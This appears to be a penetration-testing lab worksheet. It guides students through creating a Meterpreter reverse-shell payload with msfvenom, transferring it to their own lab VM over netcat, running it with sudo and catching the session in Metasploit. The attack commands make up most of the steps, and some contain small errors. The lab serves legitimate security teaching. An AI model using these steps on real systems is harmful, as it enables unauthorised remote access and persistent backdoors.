## Activity Objective:

Students will create a Meterpreter payload to establish a backdoor on their Ubuntu Server, simulating the post-exploitation phase of a penetration test. By the end of the activity, students will be able to:
1. Explain the goals and significance of the post-exploitation phase in the penetration testing lifecycle.
2. Use Metasploit to create a Meterpreter payload tailored for the Ubuntu Server environment.
3. Successfully deploy the Meterpreter payload to gain access to the Ubuntu Server and establish a persistent backdoor.
4. Navigate the Meterpreter session to execute commands, gather system information, and explore the compromised environment.
5. Understanding the implications of an attacker establishing a reverse shell, including potential risks to system integrity and confidentiality.



## Activity Instructions:

Follow the instructions below to simulate an attacker abusing a file upload vulnerability to gain unauthorized access to a web server.
1. Log into your Red Team VM, and create a new directory on your desktop named "Penetration-Test" and change into this directory within the terminal.
2. Verify that Metasploit is installed to your machine by executing msfconsole. If Metasploit is not installed, run `apt update && apt install -y metasploit-framework`. Once installed run Metasploit by executing `msfconsole`.
3. Log into the target server (your Blue Team VM) and run `lscpu` or execute a NMAP scan to confirm the architecture and.or byte order of your VM's operating system.
4. On your Red Team VM, search Metasploit for a reverse_tcp payload that will allow you to deploy a backdoor on your ubuntu server.
5. Use msfvenom to create the following payload: `msfvenom -p linux/<target_arch>/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f elf > shell.elf`. (Remember: use the architecture for your Ubuntu Server).
6. List the current contents of your "penetration-test" directory to verify that the meterpreter payload was created.
7. Due to the fact that DVWA is deployed within a container this prevents an attacker from uploading the malware directly to the server. However, for this activity we will assume that we have [escaped the container](https://unit42.paloaltonetworks.com/container-escape-techniques/) and placed the meterpeter payload on the target machine. This will be simulated through steps 9 - 16 using netcat to place the shell.elf file on the target.
8. Log into your Blue Team VM and run `nc -l -p 4444 > shell.elf`.
9. On your Red Team VM run `nc [blue_team_VM_IP] 4444 < shell.elf`.
10. Close the connection on the ubuntu server and verify that the shell.elf file was copied over using netcat.
11. On your Red Team VM, and within msfconsole load the Generic Payload Handler by running `use exploit/multi/handler`.
12. Set the payload within msfconsole to the meterpreter payload you used by running `set payload linux/<target_arch>/meterpreter/reverse_tcp`.
13. Verify that the payload is set within the Generic Payload Handler module by running `options`.
14. Set the localhost to your pentest VM's IP address by running `lhost=<red-team-VM-IP>`.
15. Verify that the localhost is set within the Generic Payload Handler module by running `options`.
16. Execute the meterpreter payload by running `exploit`.
17. Go to your Blue Team VM, and simulate a user with sudo privileges accidentally executing the file by running `sudo chmod +x shell.elf && ./shelf.elf`.
18. Go to your Red Team VM and verify that the meterpreter session is active, and run `getuid` to verify that you have an active reverse shell session as the logged in user on the target machine.
19. Within the meterpreter session gather system information using the basic meterpreter commands found [here](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/).

